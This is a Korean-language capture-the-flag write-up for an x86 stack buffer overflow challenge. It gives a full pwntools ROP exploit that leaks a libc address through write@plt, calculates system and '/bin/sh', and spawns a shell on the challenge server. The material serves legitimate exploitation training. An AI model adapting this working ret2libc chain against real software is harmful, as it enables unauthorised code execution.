#ROP #x86 #스택버퍼오버플로우 #GOT_Overwrite 

### 1. 파일 정보

file ./basic_rop_x86         
./basic_rop_x86: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=f503da94f0f9ad92df1befc729116dd694f2446f, not stripped

checksec --file=./basic_rop_x86         
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols            FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   79 Symbols   No    0               1               ./basic_rop_x86

### 2. C 소스 분석

``` c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

// SIGALRM 시그널(알람 신호)을 받으면 "TIME OUT"을 출력하고 종료함.
// 즉, 프로그램이 30초 이상 실행되면 강제로 종료.
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};    // 64바이트

    initialize();

    /*
    표준 입력(stdin)에서 최대 1024바이트 읽기
    표준 출력(stdout)으로 buf의 내용을 64바이트만 출력
    읽은 데이터 중 일부만 출력
    */
    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}

```
### 3. 익스플로잇

#### 1) 익스플로잇 시나리오.
- **NX 활성화 시**
    - 셸코드 실행 불가능 → **ret2libc**로 `/bin/sh` 실행.
    - 즉, libc의 `system("/bin/sh")` 호출.
        
- **PIE/ASLR 무효화 시**
    - 바이너리/라이브러리의 주소가 고정 → 간단한 ret2libc 가능.

ASLR 이 적용되어 있기 때문에 실행 시마다 스택, 라이브러리 등의 주소가 랜덤화되고, NX가 적용되어 있기 때문에 임의의 위치에 셸코드를 집어 넣은 후 그 주소의 코드를 바로 실행시킬 수 없다.

Canary가 없기 때문에 스택 맨 위에 존재하는 SFP, RET 과 그 뒷 주소를 마음대로 변경하여도 프로세스가 자동 종료되지 않으며, PIE 가 적용되지 않기 때문에 해당 바이너리가 실행되는 메모리 주소가 랜덤화 되지 않는다.

X86 아키텍쳐에서  Return Oriented Programming 기법을 이용해서 익스플로잇 진행.

#### 2) 익스플로잇

x86의 경우 레지스터가 아닌, 스택에서 값을 pop하여 인자로 전달한다.
순서 또한 x64와는 반대로 (함수의 주소) + (pop 과정) 과 같은 형태로 payload를 작성해야 한다.
또한 x64와의 차이점은 pop 과정을 진행하는 가젯을 찾을 때, pop  횟수만 중요할 뿐, 어떤 레지스터에 값이 저장되는지는 중요하지 안다.

``` x64
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got) + p64(8)
payload += p64(write_plt)
```

``` x86
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)
```
이때, pop3_ret 가젯은 앞서 말했듯이 어떤 레지스터를 pop하는지 상관없이 횟수만 3회이면 된다.
다음과 같은 가젯을 찾아 사용 가능하다.

```
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]
```
#### r.find_gadget(\[...])
 : r 는 보통 ROP(elf) 객체이다. (예: elf = ELF("./vuln"); r = ROP(elf))
 : find_gadget(\[...]) 는 ELF 바이너리 안에서 특정 어셈블리 패턴(ROP 가젯)을 찾아 줌
 : 인자로 \['pop esi', 'pop edi', 'pop ebp' 'ret'] 를 주었으니, **"pop esi; pop edi; pop ebp; ret"** 라는 명령어 시퀀스를 찾는 것임.
 즉, 이건 스택에서 값을 3개 꺼내 각각 레지스터에 넣고, ret 하는 가젯을 찾는 것임.
#### [0]
: find_gadget 는 가능한 가젯 주소들을 리스트로 반환한다.
: [0] 은 그 중 첫 번재(가장 앞에 나온) 주소를 선택하는 것임.


x86에서는 스택에 값이 차례대로 있어야 하고,
x64에스는 레지스터를 채워야 한다.

x86 ROP
- 함수 호출시 인자가 전부 스택에서 꺼내짐
- 따라서 call function 전까지 스택에 순서대로 \[arg1, arg2, arg3, ...] 가 들어가 있으면 된다.
- 즉, 어떤 레지스터에 들어가는지 중요하지 않고, 스택 위에 값이 순서대로 올라가 있기만 하면 됨.

#### 3) 로컬 실행 및 리모트 실행시 바이너리 설정 및 필요 객체 선언.
``` python
from pwn import *

TEST = True
if TEST:
    p = process("./basic_rop_x86")
    e = ELF("./basic_rop_x86")
    libc = e.libc
else:
    p = remote('host3.dreamhack.games', 13458)
    e = ELF("./basic_rop_x86")
    libc = ELF("./libc.so.6")

# ROP(e)는 ELF에서 ROP 가젯을 자도응로 수집해서 활용할 수 있게 해 줌.
r = ROP(e)

```


#### 4) plt 주소 및 got 주소 구하기
``` python
from pwn import *

TEST = True
if TEST:
    p = process("./basic_rop_x86")
    e = ELF("./basic_rop_x86")
    libc = e.libc
else:
    p = remote('host3.dreamhack.games', 13458)
    e = ELF("./basic_rop_x86")
    libc = ELF("./libc.so.6")

# ROP(e)는 ELF에서 ROP 가젯을 자도응로 수집해서 활용할 수 있게 해 줌.
r = ROP(e)

'''
read_plt = e.plt["read"]
: read() 함수의 PLT(Procedure Linkage Table) 엔트리 주소.
: 프로그램이 read()를 호출할 때 실제로 점프하는 위치.
: 즉, ROP 체인에서 call read 같은 효과를 주고 싶을 때 사용.

read_got = e.got["read"]
: read() 함수의 GOT(Global Offset Table) 엔트리 주소.
: 실행 시작 시 read()의 실제 libc 주소가 없으므로, 처음 호출될 때 resolve 되어 GOT에 기록됨.
: puts(read_got) 같은 식으로 출력하면 libc의 실제 read() 주소를 leak할 수 있음.

main = e.symbols["main"]
: main() 함수의 주소.
:보통 첫 번째 ROP 공격(주소 leak) 후 프로그램을 정상 흐름으로 되돌리기 위해 main으로 점프시킴.
: 즉, "프로그램을 초기 상태로 리셋"하는 역할.
'''
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

```

#### 5) read 함수와 system 함수의 symbols 옵셋 구하기 / sh 주소 구하기
``` python 

'''
read_offset = libc.symbols["read"]
: libc.so.6 안에 정의된 read() 함수의 오프셋(상대 주소).
: libc는 메모리에 로드될 때 base 주소가 랜덤이지만, base + offset = 실제 주소 가 성립함.
: 따라서 leak한 read 주소에서 base를 구할 수 있음:
: libc_base = leaked_read - read_offset

system_offset = libc.symbols["system"]
: libc 안의 system() 함수 오프셋. 
: system("/bin/sh") 실행을 위해 필요
: 나중에:
: system_addr = libc_base + system_offset

sh_offset = list(libc.search(b"/bin/sh"))[0]
: libc 메모리 안에서 "/bin/sh" 문자열을 찾음.
: libc.search(b"/bin/sh") → 제너레이터 반환 (주소 후보들).
: list(...)[0] → 첫 번째 /bin/sh 문자열의 오프셋.
: 최종 실제 주소는:
: binsh_addr = libc_base + sh_offset
'''
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh_offset = list(libc.search(b"/bin/sh"))[0]

```

#### 6) 리턴 가젯 찾기

``` python

pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

```

#### 7) read_got 주소를 얻기 위한 페이로드 작성.

``` python

# Stage 1
'''
1. C소스에서 buf는 [ebp-0x44]의 위치에 있다. 해서 0x44 + 0x04(SFP) = 48
2. 스택의 다음 주소인 리턴주소를 wreit@ple로 설정
3. pop3_ret 가젯이 실행되면서 스택 값들이 레지스터/스택으로 들어감.
   결과적으로:
   fd = 1 (stdout)
   buf = read_got (GOT 에 적힌 read 실제 libc 주소)
   size = 4(4바이트만 출력)
   즉, write(1, read_got, 4) 실행 -> read 실제 주소 leak
4. write() 호출이 끝나면 main() 으로 복귀
   프로그램이 초기 상태로 리셋 -> 두 번째 공격 가능
'''
payload = b'A' * 0x48
payload += p32(write_plt)
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)


```

#### 8) 구해진 read@got를 이용하여 system, sh 주소 구하기

``` python

'''
c 소스의 read(0, buf, 0x400); 코드에서 send로 보내는 payload를 buf에 저장함

출력시점 (write 호출)
write(1, buf, 64) 에 의해 buf의 64바이트만 출력됨.
즉, 우리가 넣은 "A"*0x40까지만 출력되고, 그 뒤에 있는 "A"*8 은 출력되지 않음.
'''
p.send(payload)
p.recvuntil(b'A' * 0x40)

# Calculate libe_base
'''
그 다음 동작
1. ret -> write@ple 실행 됨. (ROP 체인으로 넘어감.)
2. ROP 체인에 따라 
   write(1, read_got, 4) 실행
3. 이 때 출력되는 새로운 데이터가 read_got의 실제 libc 주소 4바이트임.
4. 이것을 p.recvn(4)으로 받는 것임.

read@got를 이용하여 libc_base 구하기
system과 sh의 실제 주소도 구하기.
'''
read = u32(p.recvn(4))
libc_base = read - read_offset
system = libc_base + system_offset
sh = libc_base + sh_offset

print(hex(libc_base))
print(hex(system))
```

#### 9) 다시 리셋된 main함수에서 버퍼 오버플로우를 이용하여 system("/bin/sh") 실행하기

``` python
payload = b'A' * 0x48
payload += p32(system)
payload += p32(pop_ret)
payload += p32(sh)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
```


#### 10) 최종결과물
``` python
from pwn import *

TEST = False
if TEST:
    p = process("./basic_rop_x86")
    e = ELF("./basic_rop_x86")
    libc = e.libc
else:
    p = remote('host8.dreamhack.games', 18134)
    e = ELF("./basic_rop_x86")
    libc = ELF("./libc.so.6")

# ROP(e)는 ELF에서 ROP 가젯을 자도응로 수집해서 활용할 수 있게 해 줌.
r = ROP(e)

'''
read_plt = e.plt["read"]
: read() 함수의 PLT(Procedure Linkage Table) 엔트리 주소.
: 프로그램이 read()를 호출할 때 실제로 점프하는 위치.
: 즉, ROP 체인에서 call read 같은 효과를 주고 싶을 때 사용.

read_got = e.got["read"]
: read() 함수의 GOT(Global Offset Table) 엔트리 주소.
: 실행 시작 시 read()의 실제 libc 주소가 없으므로, 처음 호출될 때 resolve 되어 GOT에 기록됨.
: puts(read_got) 같은 식으로 출력하면 libc의 실제 read() 주소를 leak할 수 있음.

main = e.symbols["main"]
: main() 함수의 주소.
:보통 첫 번째 ROP 공격(주소 leak) 후 프로그램을 정상 흐름으로 되돌리기 위해 main으로 점프시킴.
: 즉, "프로그램을 초기 상태로 리셋"하는 역할.
'''
read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]
main = e.symbols["main"]

'''
read_offset = libc.symbols["read"]
: libc.so.6 안에 정의된 read() 함수의 오프셋(상대 주소).
: libc는 메모리에 로드될 때 base 주소가 랜덤이지만, base + offset = 실제 주소 가 성립함.
: 따라서 leak한 read 주소에서 base를 구할 수 있음:
: libc_base = leaked_read - read_offset

system_offset = libc.symbols["system"]
: libc 안의 system() 함수 오프셋. 
: system("/bin/sh") 실행을 위해 필요
: 나중에:
: system_addr = libc_base + system_offset

sh_offset = list(libc.search(b"/bin/sh"))[0]
: libc 메모리 안에서 "/bin/sh" 문자열을 찾음.
: libc.search(b"/bin/sh") → 제너레이터 반환 (주소 후보들).
: list(...)[0] → 첫 번째 /bin/sh 문자열의 오프셋.
: 최종 실제 주소는:
: binsh_addr = libc_base + sh_offset
'''
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
sh_offset = list(libc.search(b"/bin/sh"))[0]

pop_ret = r.find_gadget(['pop ebp', 'ret'])[0]
pop2_ret = r.find_gadget(['pop edi', 'pop ebp', 'ret'])[0]
pop3_ret = r.find_gadget(['pop esi', 'pop edi', 'pop ebp', 'ret'])[0]

# Stage 1
'''
1. C소스에서 buf는 [ebp-0x44]의 위치에 있다. 해서 0x44 + 0x04(SFP) = 48
2. 스택의 다음 주소인 리턴주소를 wreit@ple로 설정
3. pop3_ret 가젯이 실행되면서 스택 값들이 레지스터/스택으로 들어감.
   결과적으로:
   fd = 1 (stdout)
   buf = read_got (GOT 에 적힌 read 실제 libc 주소)
   size = 4(4바이트만 출력)
   즉, write(1, read_got, 4) 실행 -> read 실제 주소 leak
4. write() 호출이 끝나면 main() 으로 복귀
   프로그램이 초기 상태로 리셋 -> 두 번째 공격 가능
'''
payload = b'A' * 0x48
payload += p32(write_plt)
payload += p32(pop3_ret)
payload += p32(1) + p32(read_got) + p32(4)
payload += p32(main)

'''
c 소스의 read(0, buf, 0x400); 코드에서 send로 보내는 payload를 buf에 저장함

출력시점 (write 호출)
write(1, buf, 64) 에 의해 buf의 64바이트만 출력됨.
즉, 우리가 넣은 "A"*0x40까지만 출력되고, 그 뒤에 있는 "A"*8 은 출력되지 않음.
'''
p.send(payload)
p.recvuntil(b'A' * 0x40)

# Calculate libe_base
'''
그 다음 동작
1. ret -> write@ple 실행 됨. (ROP 체인으로 넘어감.)
2. ROP 체인에 따라 
   write(1, read_got, 4) 실행
3. 이 때 출력되는 새로운 데이터가 read_got의 실제 libc 주소 4바이트임.
4. 이것을 p.recvn(4)으로 받는 것임.

read@got를 이용하여 libc_base 구하기
system과 sh의 실제 주소도 구하기.
'''
read = u32(p.recvn(4))
libc_base = read - read_offset
system = libc_base + system_offset
sh = libc_base + sh_offset

print(hex(libc_base))
print(hex(system))

payload = b'A' * 0x48
payload += p32(system)
payload += p32(pop_ret)
payload += p32(sh)

p.send(payload)
p.recvuntil(b'A' * 0x40)

p.interactive()
```